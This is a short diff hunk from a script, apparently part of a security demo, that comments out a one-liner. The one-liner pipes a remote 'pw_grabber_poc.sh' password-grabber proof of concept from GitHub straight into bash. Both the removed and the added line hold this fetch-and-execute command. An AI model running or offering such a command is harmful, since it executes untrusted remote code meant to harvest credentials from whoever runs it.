@@ -8,8 +8,8 @@
 ###-------------------------------------------------------------------------------------------------------------------------###
 
 
-# Download an execute oneliner
-curl -sSL https://raw.githubusercontent.com/DanielRamp/SecurityAtGIBMIT/master/pw_grabber_poc.sh | bash
+# Download an execute oneliner:
+# curl -sSL https://raw.githubusercontent.com/DanielRamp/SecurityAtGIBMIT/master/pw_grabber_poc.sh | bash
 
 
 # or
